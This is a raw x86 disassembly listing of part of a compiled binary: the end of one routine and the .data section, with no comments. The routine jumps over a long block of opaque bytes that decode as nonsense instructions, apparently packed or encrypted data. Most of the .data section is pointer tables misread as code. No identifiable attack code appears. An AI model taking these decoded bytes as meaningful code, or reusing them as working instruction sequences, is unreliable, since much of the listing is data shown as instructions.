  411330:	sub    ebx,ecx
  411332:	xchg   ebx,ecx
  411334:	dec    ecx
  411335:	mov    eax,DWORD PTR [ebp-0x1c]
  411338:	imul   eax,ecx
  41133b:	add    esp,eax
  41133d:	xchg   edx,eax
  41133e:	push   eax
  41133f:	xor    ebx,ebx
  411341:	mov    edx,esp
  411343:	jmp    0x41147e
  411348:	sub    BYTE PTR [edi+0x7165615e],cl
  41134e:	xor    ebx,DWORD PTR [ebp-0x7b]
  411351:	into   
  411352:	jge    0x411370
  411354:	repz push ds
  411356:	fdiv   DWORD PTR [ebx]
  411358:	dec    ebp
  411359:	inc    ebx
  41135a:	jl     0x4113d8
  41135c:	adc    bh,BYTE PTR [edi+0x7c]
  41135f:	jl     0x41131c
  411361:	dec    esi
  411362:	frndint 
  411364:	scas   eax,DWORD PTR es:[edi]
  411365:	(bad)  
  411366:	xchg   ebp,eax
  411367:	stos   DWORD PTR es:[edi],eax
  411368:	daa    
  411369:	es sti 
  41136b:	out    dx,al
  41136c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41136d:	pop    ecx
  41136e:	jno    0x4113dc
  411370:	test   al,0x95
  411372:	pop    esi
  411373:	mov    ebp,0x48f2ec4a
  411378:	dec    edi
  411379:	retf   
  41137a:	loope  0x411364
  41137c:	mov    eax,ds:0xd9c93760
  411381:	mov    eax,0xc30a3372
  411386:	and    eax,0xf07d8cf
  41138b:	inc    esi
  41138c:	jmp    0x65b:0x5f2e8070
  411393:	pop    edi
  411394:	data16 repz mov gs,WORD PTR [edx+0x59c0ad81]
  41139c:	mov    ebx,DWORD PTR [ecx]
  41139e:	mov    ecx,DWORD PTR [edx]
  4113a0:	int    0x2c
  4113a2:	push   0x44644fd8
  4113a7:	in     eax,0xd0
  4113a9:	inc    edx
  4113aa:	scas   al,BYTE PTR es:[edi]
  4113ab:	inc    ebp
  4113ac:	push   eax
  4113ad:	loopne 0x411382
  4113af:	add    dl,BYTE PTR [edx]
  4113b1:	fild   DWORD PTR [ebx]
  4113b3:	jb     0x411369
  4113b5:	inc    esi
  4113b6:	jmp    0x4113f3
  4113b8:	rcr    DWORD PTR [edi+0x7353b63b],cl
  4113be:	mov    bh,0xeb
  4113c0:	(bad)  
  4113c1:	mov    edx,0xfeb883d1
  4113c6:	lods   al,BYTE PTR ds:[esi]
  4113c7:	mov    esp,0x18e4b5ca
  4113cc:	sahf   
  4113cd:	das    
  4113ce:	idiv   BYTE PTR [eax+esi*4-0x4f]
  4113d2:	jno    0x41144e
  4113d4:	jno    0x4113c8
  4113d6:	or     al,0x23
  4113d8:	rcr    DWORD PTR [eax],0x19
  4113db:	add    BYTE PTR [esi-0x1a2459a4],dl
  4113e1:	inc    ebx
  4113e2:	xor    ch,BYTE PTR [edx+0x31bb2c95]
  4113e8:	push   es
  4113e9:	lea    eax,[ebp+esi*2-0x10661cb8]
  4113f0:	mov    ah,0xc8
  4113f2:	outs   dx,DWORD PTR ds:[esi]
  4113f3:	nop
  4113f4:	out    dx,eax
  4113f5:	repnz mov ebp,gs
  4113f8:	jle    0x411459
  4113fa:	ja     0x411418
  4113fc:	jmp    0x4113ce
  4113fe:	xchg   edx,eax
  4113ff:	popa   
  411400:	cmp    edx,0x1ce15fa2
  411406:	lods   al,BYTE PTR ds:[esi]
  411407:	stos   DWORD PTR es:[edi],eax
  411408:	bound  esi,QWORD PTR [edi+0x1b]
  41140b:	stos   BYTE PTR es:[edi],al
  41140c:	icebp  
  41140d:	and    BYTE PTR [ecx],ch
  41140f:	adc    esp,ebp
  411411:	std    
  411412:	sbb    DWORD PTR [ebp-0x61],ebp
  411415:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411416:	in     eax,0x29
  411418:	adc    eax,0x77a3646b
  41141d:	fcom   QWORD PTR [esi+0x25b82405]
  411423:	push   esi
  411424:	test   BYTE PTR [esp+edi*8+0x4f5ae6f7],cl
  41142b:	sar    dl,cl
  41142d:	or     DWORD PTR [ebx+0xd3f6859],edx
  411433:	cli    
  411434:	mov    edi,0xb2818782
  411439:	jle    0x4113dc
  41143b:	daa    
  41143c:	or     eax,0x9ae7f901
  411441:	mov    DWORD PTR [ebx-0x52],ebp
  411444:	aaa    
  411445:	ins    BYTE PTR es:[edi],dx
  411446:	arpl   WORD PTR [edi],bx
  411448:	pop    eax
  411449:	mov    bh,0xff
  41144b:	mov    dh,0x91
  41144d:	or     DWORD PTR [ebp-0x4e],ebx
  411450:	mov    bl,0xce
  411452:	loopne 0x4114ac
  411454:	test   eax,0x242e4372
  411459:	cli    
  41145a:	sbb    eax,0xcdf64b03
  41145f:	aad    0x56
  411461:	sub    bh,bl
  411463:	mov    eax,ds:0x80e8fbc3
  411468:	xchg   esp,eax
  411469:	adc    BYTE PTR cs:[ecx],dh
  41146c:	cs (bad) 
  41146e:	jbe    0x4114bd
  411470:	mul    edx
  411472:	inc    ecx
  411473:	mov    esi,0x3a96924e
  411478:	mul    DWORD PTR [edx-0x10]
  41147b:	push   ebx
  41147c:	bound  esi,QWORD PTR [edi+0x1c03434a]
  411482:	sbb    cl,BYTE PTR [ebx+0x33]
  411485:	rol    BYTE PTR [ecx],cl
  411487:	pop    ebp
  411488:	hlt    
  411489:	pop    ebx
  41148a:	mov    eax,DWORD PTR [ebp-0xc]
  41148d:	pop    edi
  41148e:	pop    esi
  41148f:	pop    ebx
  411490:	leave  
  411491:	ret    0x10

Disassembly of section .data:

00412000 <.data>:
  412000:	and    BYTE PTR [ecx],ch
  412002:	add    DWORD PTR [eax],eax
  412004:	sub    ch,BYTE PTR [ecx]
  412006:	add    DWORD PTR [eax],eax
  412008:	xor    al,0x29
  41200a:	add    DWORD PTR [eax],eax
  41200c:	inc    eax
  41200d:	sub    DWORD PTR [ecx],eax
  41200f:	add    BYTE PTR [edx+0x29],cl
  412012:	add    DWORD PTR [eax],eax
  412014:	pop    eax
  412015:	sub    DWORD PTR [ecx],eax
  412017:	add    BYTE PTR [edx+0x29],ah
  41201a:	add    DWORD PTR [eax],eax
  41201c:	je     0x412047
  41201e:	add    DWORD PTR [eax],eax
  412020:	jle    0x41204b
  412022:	add    DWORD PTR [eax],eax
  412024:	mov    WORD PTR [ecx],gs
  412026:	add    DWORD PTR [eax],eax
  412028:	xchg   esi,eax
  412029:	sub    DWORD PTR [ecx],eax
  41202b:	add    BYTE PTR [esi-0x4ffffed7],ah
  412031:	sub    DWORD PTR [ecx],eax
  412033:	add    BYTE PTR [ecx+ebp*1+0x29c60001],bh
  41203a:	add    DWORD PTR [eax],eax
  41203c:	aam    0x29
  41203e:	add    DWORD PTR [eax],eax
  412040:	loopne 0x41206b
  412042:	add    DWORD PTR [eax],eax
  412044:	jmp    0x129:0xf2000129
  41204b:	add    BYTE PTR [eax],al
  41204d:	sub    al,BYTE PTR [ecx]
  41204f:	add    BYTE PTR [edx],cl
  412051:	sub    al,BYTE PTR [ecx]
  412053:	add    BYTE PTR [edx+ebp*1],dl
  412056:	add    DWORD PTR [eax],eax
  412058:	and    ch,BYTE PTR [edx]
  41205a:	add    DWORD PTR [eax],eax
  41205c:	sub    al,0x2a
  41205e:	add    DWORD PTR [eax],eax
  412060:	xor    al,0x2a
  412062:	add    DWORD PTR [eax],eax
  412064:	inc    eax
  412065:	sub    al,BYTE PTR [ecx]
  412067:	add    BYTE PTR [edx+0x2a],cl
  41206a:	add    DWORD PTR [eax],eax
  41206c:	push   esp
  41206d:	sub    al,BYTE PTR [ecx]
  41206f:	add    BYTE PTR [esi+0x2a],bl
  412072:	add    DWORD PTR [eax],eax
  412074:	data16 sub al,BYTE PTR [ecx]
  412077:	add    BYTE PTR [eax+0x2a],dh
  41207a:	add    DWORD PTR [eax],eax
  41207c:	jp     0x4120a8
  41207e:	add    DWORD PTR [eax],eax
  412080:	sub    BYTE PTR [edx],0x1
  412083:	add    BYTE PTR [esi-0x65fffed6],cl
  412089:	sub    al,BYTE PTR [ecx]
  41208b:	add    BYTE PTR [edx-0x53fffed6],ah
  412091:	sub    al,BYTE PTR [ecx]
  412093:	add    BYTE PTR [edx+ebp*1+0x2ac00001],dh
  41209a:	add    DWORD PTR [eax],eax
  41209c:	retf   0x12a
  41209f:	add    ah,dl
  4120a1:	sub    al,BYTE PTR [ecx]
  4120a3:	add    dh,bl
  4120a5:	sub    al,BYTE PTR [ecx]
  4120a7:	add    dl,dh
  4120a9:	sub    al,BYTE PTR [ecx]
  4120ab:	add    dh,bh
  4120ad:	sub    al,BYTE PTR [ecx]
  4120af:	add    BYTE PTR [eax],al
  4120b1:	add    BYTE PTR [eax],al
  4120b3:	add    BYTE PTR [edx],bl
  4120b5:	sub    eax,DWORD PTR [ecx]
  4120b7:	add    BYTE PTR [esi],ch
  4120b9:	sub    eax,DWORD PTR [ecx]
  4120bb:	add    BYTE PTR [esi],bh
  4120bd:	sub    eax,DWORD PTR [ecx]
  4120bf:	add    BYTE PTR [ebx+ebp*1+0x1],cl
  4120c3:	add    BYTE PTR [eax+0x2b],bl
  4120c6:	add    DWORD PTR [eax],eax
  4120c8:	push   0x7e00012b
  4120cd:	sub    eax,DWORD PTR [ecx]
  4120cf:	add    BYTE PTR [edx-0x59fffed5],dl
  4120d5:	sub    eax,DWORD PTR [ecx]
  4120d7:	add    BYTE PTR [ebx+ebp*1+0x2bca0001],bh
  4120de:	add    DWORD PTR [eax],eax
  4120e0:	loopne 0x41210d
  4120e2:	add    DWORD PTR [eax],eax
  4120e4:	in     al,dx
  4120e5:	sub    eax,DWORD PTR [ecx]
  4120e7:	add    dh,bh
  4120e9:	sub    eax,DWORD PTR [ecx]
  4120eb:	add    BYTE PTR [esi],dl
  4120ed:	sub    al,0x1
  4120ef:	add    BYTE PTR [eax],ch
  4120f1:	sub    al,0x1
  4120f3:	add    BYTE PTR [eax],bh
  4120f5:	sub    al,0x1
  4120f7:	add    BYTE PTR [edx+0x2c],al
  4120fa:	add    DWORD PTR [eax],eax
  4120fc:	pop    eax
  4120fd:	sub    al,0x1
  4120ff:	add    BYTE PTR [edx+0x2c],dh
  412102:	add    DWORD PTR [eax],eax
  412104:	jle    0x412132
  412106:	add    DWORD PTR [eax],eax
  412108:	mov    ch,BYTE PTR [ecx+eax*1]
  41210b:	add    BYTE PTR [esi-0x47fffed4],bl
  412111:	sub    al,0x1
  412113:	add    ah,al
  412115:	sub    al,0x1
  412117:	add    dl,dl
  412119:	sub    al,0x1
  41211b:	add    ah,ah
  41211d:	sub    al,0x1
  41211f:	add    al,dh
  412121:	sub    al,0x1
  412123:	add    BYTE PTR [esi],al
  412125:	sub    eax,0x2d140001
  41212a:	add    DWORD PTR [eax],eax
  41212c:	and    ch,BYTE PTR ds:0x2d300001
  412132:	add    DWORD PTR [eax],eax
  412134:	dec    edx
  412135:	sub    eax,0x2d5e0001
  41213a:	add    DWORD PTR [eax],eax
  41213c:	push   0x2d
  41213e:	add    DWORD PTR [eax],eax
  412140:	jp     0x41216f
  412142:	add    DWORD PTR [eax],eax
  412144:	xchg   esi,eax
  412145:	sub    eax,0x2da60001
  41214a:	add    DWORD PTR [eax],eax
  41214c:	mov    dh,0x2d
  41214e:	add    DWORD PTR [eax],eax
  412150:	(bad)  
  412151:	sub    eax,0x2dd20001
  412156:	add    DWORD PTR [eax],eax
  412158:	loop   0x412187
  41215a:	add    DWORD PTR [eax],eax
  41215c:	hlt    
  41215d:	sub    eax,0x2dfe0001
  412162:	add    DWORD PTR [eax],eax
  412164:	push   cs
  412165:	add    DWORD PTR cs:[eax],eax
  412168:	push   ds
  412169:	add    DWORD PTR cs:[eax],eax
  41216c:	sub    BYTE PTR [esi],ch
  41216e:	add    DWORD PTR [eax],eax
  412170:	add    BYTE PTR [eax],al
  412172:	add    BYTE PTR [eax],al
  412174:	dec    edx
  412175:	add    DWORD PTR cs:[eax],eax
  412178:	add    BYTE PTR [eax],al
  41217a:	add    BYTE PTR [eax],al
  41217c:	push   0x8000012e
  412181:	add    DWORD PTR cs:[eax],eax
  412184:	mov    WORD PTR [esi],gs
  412186:	add    DWORD PTR [eax],eax
  412188:	call   0x12e:0xb200012e
  41218f:	add    dh,al
  412191:	add    DWORD PTR cs:[eax],eax
  412194:	fsubr  QWORD PTR [esi]
  412196:	add    DWORD PTR [eax],eax
  412198:	call   0xf84122cb
  41219d:	add    DWORD PTR cs:[eax],eax
  4121a0:	adc    BYTE PTR [edi],ch
  4121a2:	add    DWORD PTR [eax],eax
  4121a4:	push   ds
  4121a5:	das    
  4121a6:	add    DWORD PTR [eax],eax
  4121a8:	xor    BYTE PTR [edi],ch
  4121aa:	add    DWORD PTR [eax],eax
  4121ac:	inc    eax
  4121ad:	das    
  4121ae:	add    DWORD PTR [eax],eax
  4121b0:	push   esi
  4121b1:	das    
  4121b2:	add    DWORD PTR [eax],eax
  4121b4:	data16 das 
  4121b6:	add    DWORD PTR [eax],eax
  4121b8:	jbe    0x4121e9
  4121ba:	add    DWORD PTR [eax],eax
  4121bc:	mov    ch,BYTE PTR [edi]
  4121be:	add    DWORD PTR [eax],eax
  4121c0:	xchg   esi,eax
  4121c1:	das    
  4121c2:	add    DWORD PTR [eax],eax
  4121c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4121c5:	das    
  4121c6:	add    DWORD PTR [eax],eax
  4121c8:	mov    dl,0x2f
  4121ca:	add    DWORD PTR [eax],eax
  4121cc:	enter  0x12f,0x0
  4121d0:	loopne 0x412201
  4121d2:	add    DWORD PTR [eax],eax
  4121d4:	hlt    
  4121d5:	das    
  4121d6:	add    DWORD PTR [eax],eax
  4121d8:	add    dh,BYTE PTR [eax]
  4121da:	add    DWORD PTR [eax],eax
  4121dc:	sbb    BYTE PTR [eax],dh
  4121de:	add    DWORD PTR [eax],eax
  4121e0:	xor    BYTE PTR cs:[ecx],al
  4121e3:	add    BYTE PTR [edx],bh
  4121e5:	xor    BYTE PTR [ecx],al
  4121e7:	add    BYTE PTR [eax+0x30],cl
  4121ea:	add    DWORD PTR [eax],eax
  4121ec:	push   edx
  4121ed:	xor    BYTE PTR [ecx],al
  4121ef:	add    BYTE PTR [esi+0x30],ah
  4121f2:	add    DWORD PTR [eax],eax
  4121f4:	jbe    0x412226
  4121f6:	add    DWORD PTR [eax],eax
  4121f8:	mov    dh,BYTE PTR [eax]
  4121fa:	add    DWORD PTR [eax],eax
  4121fc:	pushf  
  4121fd:	xor    BYTE PTR [ecx],al
  4121ff:	add    BYTE PTR [eax-0x3bfffed0],dh
  412205:	xor    BYTE PTR [ecx],al
  412207:	add    ah,dl
  412209:	xor    BYTE PTR [ecx],al
  41220b:	add    dl,ch
  41220d:	xor    BYTE PTR [ecx],al
  41220f:	add    BYTE PTR [edx],al
  412211:	xor    DWORD PTR [ecx],eax
  412213:	add    BYTE PTR [edx],bl
  412215:	xor    DWORD PTR [ecx],eax
  412217:	add    BYTE PTR [esi],ah
  412219:	xor    DWORD PTR [ecx],eax
  41221b:	add    BYTE PTR [eax],bh
  41221d:	xor    DWORD PTR [ecx],eax
  41221f:	add    BYTE PTR [edx+0x31],cl
  412222:	add    DWORD PTR [eax],eax
  412224:	push   esi
  412225:	xor    DWORD PTR [ecx],eax
  412227:	add    BYTE PTR [eax+0x31],ch
  41222a:	add    DWORD PTR [eax],eax
  41222c:	jbe    0x41225f
  41222e:	add    DWORD PTR [eax],eax
  412230:	xor    BYTE PTR [ecx],0x1
  412233:	add    BYTE PTR [esi-0x59fffecf],dl
  412239:	xor    DWORD PTR [ecx],eax
  41223b:	add    BYTE PTR [eax-0x2dfffecf],bh
  412241:	xor    DWORD PTR [ecx],eax
  412243:	add    dl,ch
  412245:	xor    DWORD PTR [ecx],eax
  412247:	add    BYTE PTR [eax],al
  412249:	add    BYTE PTR [eax],al
  41224b:	add    BYTE PTR [esi],al
  41224d:	xor    al,BYTE PTR [ecx]
  41224f:	add    BYTE PTR [edx+esi*1],bl
  412252:	add    DWORD PTR [eax],eax
  412254:	xor    dh,BYTE PTR [edx]
  412256:	add    DWORD PTR [eax],eax
  412258:	inc    edx
  412259:	xor    al,BYTE PTR [ecx]
  41225b:	add    BYTE PTR [edx+0x32],dl
  41225e:	add    DWORD PTR [eax],eax
  412260:	pusha  
  412261:	xor    al,BYTE PTR [ecx]
  412263:	add    BYTE PTR [eax+0x32],dh
  412266:	add    DWORD PTR [eax],eax
  412268:	test   BYTE PTR [edx],dh
  41226a:	add    DWORD PTR [eax],eax
  41226c:	xchg   esp,eax
  41226d:	xor    al,BYTE PTR [ecx]
  41226f:	add    BYTE PTR [eax-0x41fffece],ch
  412275:	xor    al,BYTE PTR [ecx]
  412277:	add    ah,cl
  412279:	xor    al,BYTE PTR [ecx]
  41227b:	add    al,ah
  41227d:	xor    al,BYTE PTR [ecx]
  41227f:	add    al,dh
  412281:	xor    al,BYTE PTR [ecx]
  412283:	add    BYTE PTR [edx],al
  412285:	xor    eax,DWORD PTR [ecx]
  412287:	add    BYTE PTR [edx],bl
  412289:	xor    eax,DWORD PTR [ecx]
  41228b:	add    BYTE PTR [esi],ah
  41228d:	xor    eax,DWORD PTR [ecx]
  41228f:	add    BYTE PTR [ebx+esi*1],dh
  412292:	add    DWORD PTR [eax],eax
  412294:	inc    esp
  412295:	xor    eax,DWORD PTR [ecx]
  412297:	add    BYTE PTR [edx+0x33],dl
  41229a:	add    DWORD PTR [eax],eax
  41229c:	push   0x7a000133
  4122a1:	xor    eax,DWORD PTR [ecx]
  4122a3:	add    BYTE PTR [esi-0x6bfffecd],al
  4122a9:	xor    eax,DWORD PTR [ecx]
  4122ab:	add    BYTE PTR [esi-0x4bfffecd],ah
  4122b1:	xor    eax,DWORD PTR [ecx]
  4122b3:	add    dh,al
  4122b5:	xor    eax,DWORD PTR [ecx]
  4122b7:	add    al,bl
  4122b9:	xor    eax,DWORD PTR [ecx]
  4122bb:	add    dl,ch
  4122bd:	xor    eax,DWORD PTR [ecx]
  4122bf:	add    dl,bh
  4122c1:	xor    eax,DWORD PTR [ecx]
  4122c3:	add    BYTE PTR [esi],al
  4122c5:	xor    al,0x1
  4122c7:	add    BYTE PTR [esp+esi*1],bl
  4122ca:	add    DWORD PTR [eax],eax
  4122cc:	cmp    BYTE PTR [ecx+eax*1],dh
  4122cf:	add    BYTE PTR [edx+0x34],dl
  4122d2:	add    DWORD PTR [eax],eax
  4122d4:	data16 xor al,0x1
  4122d7:	add    BYTE PTR [esp+esi*1+0x1],dh
  4122db:	add    BYTE PTR [eax-0x6dfffecc],al
  4122e1:	xor    al,0x1
  4122e3:	add    BYTE PTR [edx-0x51fffecc],ah
  4122e9:	xor    al,0x1
  4122eb:	add    BYTE PTR [edx-0x37fffecc],bh
  4122f1:	xor    al,0x1
  4122f3:	add    al,ah
  4122f5:	xor    al,0x1
  4122f7:	add    al,dh
  4122f9:	xor    al,0x1
  4122fb:	add    BYTE PTR [eax],cl
  4122fd:	xor    eax,0x351a0001
  412302:	add    DWORD PTR [eax],eax
  412304:	sub    dh,BYTE PTR ds:0x35380001
  41230a:	add    DWORD PTR [eax],eax
  41230c:	dec    edx
  41230d:	xor    eax,0x35580001
  412312:	add    DWORD PTR [eax],eax
  412314:	fs xor eax,0x35720001
  41231a:	add    DWORD PTR [eax],eax
  41231c:	jl     0x412353
  41231e:	add    DWORD PTR [eax],eax
  412320:	xchg   esp,eax
  412321:	xor    eax,0x35a40001
  412326:	add    DWORD PTR [eax],eax
  412328:	mov    ah,0x35
  41232a:	add    DWORD PTR [eax],eax
  41232c:	ret    0x135
  41232f:	add    al,dl
  412331:	xor    eax,0x35e00001
  412336:	add    DWORD PTR [eax],eax
  412338:	div    BYTE PTR ds:0x36080001
  41233e:	add    DWORD PTR [eax],eax
  412340:	push   ss
  412341:	add    DWORD PTR ss:[eax],eax
  412344:	sub    al,0x36
  412346:	add    DWORD PTR [eax],eax
  412348:	cmp    dh,BYTE PTR [esi]
  41234a:	add    DWORD PTR [eax],eax
  41234c:	push   edx
  41234d:	add    DWORD PTR ss:[eax],eax
  412350:	pop    esi
  412351:	add    DWORD PTR ss:[eax],eax
  412354:	push   0x36
  412356:	add    DWORD PTR [eax],eax
  412358:	jbe    0x412390
  41235a:	add    DWORD PTR [eax],eax
  41235c:	test   BYTE PTR [esi],dh
  41235e:	add    DWORD PTR [eax],eax
  412360:	xchg   esi,eax
  412361:	add    DWORD PTR ss:[eax],eax
  412364:	mov    ds:0xb4000136,al
  412369:	add    DWORD PTR ss:[eax],eax
  41236c:	shl    BYTE PTR [esi],0x1
  41236f:	add    dh,cl
  412371:	add    DWORD PTR ss:[eax],eax
  412374:	fdiv   QWORD PTR [esi]
  412376:	add    DWORD PTR [eax],eax
  412378:	call   0xf64124b3
  41237d:	add    DWORD PTR ss:[eax],eax
  412380:	add    al,0x37
  412382:	add    DWORD PTR [eax],eax
  412384:	adc    al,0x37
  412386:	add    DWORD PTR [eax],eax
  412388:	es aaa 
  41238a:	add    DWORD PTR [eax],eax
  41238c:	cmp    al,0x37
  41238e:	add    DWORD PTR [eax],eax
  412390:	inc    esi
  412391:	aaa    
  412392:	add    DWORD PTR [eax],eax
  412394:	push   esp
  412395:	aaa    
  412396:	add    DWORD PTR [eax],eax
  412398:	fs aaa 
  41239a:	add    DWORD PTR [eax],eax
  41239c:	jbe    0x4123d5
  41239e:	add    DWORD PTR [eax],eax
  4123a0:	test   BYTE PTR [edi],dh
  4123a2:	add    DWORD PTR [eax],eax
  4123a4:	cwde   
  4123a5:	aaa    
  4123a6:	add    DWORD PTR [eax],eax
  4123a8:	mov    dl,0x37
  4123aa:	add    DWORD PTR [eax],eax
  4123ac:	les    esi,FWORD PTR [edi]
  4123ae:	add    DWORD PTR [eax],eax
  4123b0:	aam    0x37
  4123b2:	add    DWORD PTR [eax],eax
  4123b4:	call   0xfa4124f0
  4123b9:	aaa    
  4123ba:	add    DWORD PTR [eax],eax
  4123bc:	or     bh,BYTE PTR [eax]
  4123be:	add    DWORD PTR [eax],eax
  4123c0:	push   ss
  4123c1:	cmp    BYTE PTR [ecx],al
  4123c3:	add    BYTE PTR [eax+edi*1],dh
  4123c6:	add    DWORD PTR [eax],eax
  4123c8:	inc    esi
  4123c9:	cmp    BYTE PTR [ecx],al
  4123cb:	add    BYTE PTR [eax+edi*1+0x1],bl
  4123cf:	add    BYTE PTR [eax+0x38],bh
  4123d2:	add    DWORD PTR [eax],eax
  4123d4:	nop
  4123d5:	cmp    BYTE PTR [ecx],al
  4123d7:	add    BYTE PTR [eax+edi*1+0x38b00001],bl
  4123de:	add    DWORD PTR [eax],eax
  4123e0:	mov    edx,0xc8000138
  4123e5:	cmp    BYTE PTR [ecx],al
  4123e7:	add    ah,ah
  4123e9:	cmp    BYTE PTR [ecx],al
  4123eb:	add    dl,dh
  4123ed:	cmp    BYTE PTR [ecx],al
  4123ef:	add    BYTE PTR [esi],al
  4123f1:	cmp    DWORD PTR [ecx],eax
  4123f3:	add    BYTE PTR [eax],bl
  4123f5:	cmp    DWORD PTR [ecx],eax
  4123f7:	add    BYTE PTR [edx],ch
  4123f9:	cmp    DWORD PTR [ecx],eax
  4123fb:	add    BYTE PTR [edx],bh
  4123fd:	cmp    DWORD PTR [ecx],eax
  4123ff:	add    BYTE PTR [eax+0x39],dl
  412402:	add    DWORD PTR [eax],eax
  412404:	cmp    WORD PTR [ecx],ax
	...
  41240f:	add    dh,cl
  412411:	add    al,cl
  412413:	dec    ebp
  412414:	add    BYTE PTR [eax],al
  412416:	add    BYTE PTR [eax],al
  412418:	add    al,BYTE PTR [eax]
  41241a:	add    BYTE PTR [eax],al
  41241c:	dec    ebp
  41241d:	add    BYTE PTR [eax],al
  41241f:	add    BYTE PTR [edx],bh
  412421:	cmp    DWORD PTR [ebx],eax
  412423:	add    BYTE PTR [edx],bh
  412425:	and    eax,DWORD PTR [ebx]
	...
  41242f:	add    dh,cl
  412431:	add    al,cl
  412433:	dec    ebp
  412434:	add    BYTE PTR [eax],al
  412436:	add    BYTE PTR [eax],al
  412438:	pop    esi
  412439:	and    al,0x1
  41243b:	add    BYTE PTR [ecx],al
  41243d:	add    BYTE PTR [eax],al
  41243f:	add    BYTE PTR [ecx],al
  412441:	add    BYTE PTR [eax],al
  412443:	add    BYTE PTR [ecx],al
  412445:	add    BYTE PTR [eax],al
  412447:	add    BYTE PTR [esp+0x1],dl
  41244b:	add    BYTE PTR [eax+0x24],bl
  41244e:	add    DWORD PTR [eax],eax
  412450:	pop    esp
  412451:	and    al,0x1
  412453:	add    BYTE PTR [esi+0x6f000032],al
  412459:	and    al,0x1
  41245b:	add    BYTE PTR [eax],al
  41245d:	add    BYTE PTR [esi+0x64],ch
  412460:	jae    0x4124d4
  412462:	bound  esp,QWORD PTR [esi+0x64]
  412465:	push   edi
  412466:	inc    si
  412468:	popa   
  412469:	xor    al,0x2e
  41246b:	je     0x4124dc
  41246d:	jo     0x41246f
  41246f:	aas    
  412470:	dec    eax
  412471:	imul   esp,DWORD PTR [ebp+eiz*2+0x50],0x746e696f
  412479:	gs jb  0x4124cb
  41247c:	jb     0x4124e7
  41247e:	imul   ebp,DWORD PTR [bp+0x61],0x5940406c
  412486:	inc    edi
  412487:	inc    esi
  412488:	dec    ebx
  412489:	push   eax
  41248a:	inc    ecx
  41248b:	dec    ecx
  41248c:	push   eax
  41248d:	inc    ecx
  41248e:	inc    esp
  41248f:	cmp    al,0x56
	...
  412499:	add    BYTE PTR [eax],al
  41249b:	add    BYTE PTR [eiz*1+0x1],dl
  4124a2:	add    BYTE PTR [eax],al
  4124a4:	add    BYTE PTR [eax],al
  4124a6:	add    BYTE PTR [eax],al
  4124a8:	push   cs
  4124a9:	sub    eax,DWORD PTR [ecx]
  4124ab:	add    BYTE PTR [eax],al
  4124ad:	and    BYTE PTR [ecx],al
  4124af:	add    al,cl
  4124b1:	and    eax,0x1
  4124b6:	add    BYTE PTR [eax],al
  4124b8:	add    BYTE PTR [eax],al
  4124ba:	add    BYTE PTR [eax],al
  4124bc:	inc    eax
  4124bd:	add    DWORD PTR cs:[eax],eax
  4124c0:	mov    ah,0x20
  4124c2:	add    DWORD PTR [eax],eax
  4124c4:	mov    BYTE PTR [esi],ah
  4124c6:	add    DWORD PTR [eax],eax
	...
  4124d0:	pop    esp
  4124d1:	add    DWORD PTR cs:[eax],eax
  4124d4:	je     0x4124f7
  4124d6:	add    DWORD PTR [eax],eax
  4124d8:	nop
  4124d9:	add    DWORD PTR es:[eax],eax
	...
  4124e4:	clc    
  4124e5:	xor    DWORD PTR [ecx],eax
  4124e7:	add    BYTE PTR [ecx+eiz*1+0x1],bh
  4124eb:	add    BYTE PTR [eax+0x27],ah
  4124ee:	add    DWORD PTR [eax],eax
	...
  4124f8:	jb     0x412533
  4124fa:	add    DWORD PTR [eax],eax
  4124fc:	dec    esp
  4124fd:	and    al,BYTE PTR [ecx]
	...
  412513:	add    BYTE PTR [eax],ah
  412515:	sub    DWORD PTR [ecx],eax
  412517:	add    BYTE PTR [edx],ch
  412519:	sub    DWORD PTR [ecx],eax
  41251b:	add    BYTE PTR [ecx+ebp*1],dh
  41251e:	add    DWORD PTR [eax],eax
  412520:	inc    eax
  412521:	sub    DWORD PTR [ecx],eax
  412523:	add    BYTE PTR [edx+0x29],cl
  412526:	add    DWORD PTR [eax],eax
  412528:	pop    eax
  412529:	sub    DWORD PTR [ecx],eax
  41252b:	add    BYTE PTR [edx+0x29],ah
  41252e:	add    DWORD PTR [eax],eax
  412530:	je     0x41255b
  412532:	add    DWORD PTR [eax],eax
  412534:	jle    0x41255f
  412536:	add    DWORD PTR [eax],eax
  412538:	mov    WORD PTR [ecx],gs
  41253a:	add    DWORD PTR [eax],eax
  41253c:	xchg   esi,eax
  41253d:	sub    DWORD PTR [ecx],eax
  41253f:	add    BYTE PTR [esi-0x4ffffed7],ah
  412545:	sub    DWORD PTR [ecx],eax
  412547:	add    BYTE PTR [ecx+ebp*1+0x29c60001],bh
  41254e:	add    DWORD PTR [eax],eax
  412550:	aam    0x29
  412552:	add    DWORD PTR [eax],eax
  412554:	loopne 0x41257f
  412556:	add    DWORD PTR [eax],eax
  412558:	jmp    0x129:0xf2000129
  41255f:	add    BYTE PTR [eax],al
  412561:	sub    al,BYTE PTR [ecx]
  412563:	add    BYTE PTR [edx],cl
  412565:	sub    al,BYTE PTR [ecx]
  412567:	add    BYTE PTR [edx+ebp*1],dl
  41256a:	add    DWORD PTR [eax],eax
  41256c:	and    ch,BYTE PTR [edx]
  41256e:	add    DWORD PTR [eax],eax
  412570:	sub    al,0x2a
  412572:	add    DWORD PTR [eax],eax
  412574:	xor    al,0x2a
  412576:	add    DWORD PTR [eax],eax
  412578:	inc    eax
  412579:	sub    al,BYTE PTR [ecx]
  41257b:	add    BYTE PTR [edx+0x2a],cl
  41257e:	add    DWORD PTR [eax],eax
  412580:	push   esp
  412581:	sub    al,BYTE PTR [ecx]
  412583:	add    BYTE PTR [esi+0x2a],bl
  412586:	add    DWORD PTR [eax],eax
  412588:	data16 sub al,BYTE PTR [ecx]
  41258b:	add    BYTE PTR [eax+0x2a],dh
  41258e:	add    DWORD PTR [eax],eax
  412590:	jp     0x4125bc
  412592:	add    DWORD PTR [eax],eax
  412594:	sub    BYTE PTR [edx],0x1
  412597:	add    BYTE PTR [esi-0x65fffed6],cl
  41259d:	sub    al,BYTE PTR [ecx]
  41259f:	add    BYTE PTR [edx-0x53fffed6],ah
  4125a5:	sub    al,BYTE PTR [ecx]
  4125a7:	add    BYTE PTR [edx+ebp*1+0x2ac00001],dh
  4125ae:	add    DWORD PTR [eax],eax
  4125b0:	retf   0x12a
  4125b3:	add    ah,dl
  4125b5:	sub    al,BYTE PTR [ecx]
  4125b7:	add    dh,bl
  4125b9:	sub    al,BYTE PTR [ecx]
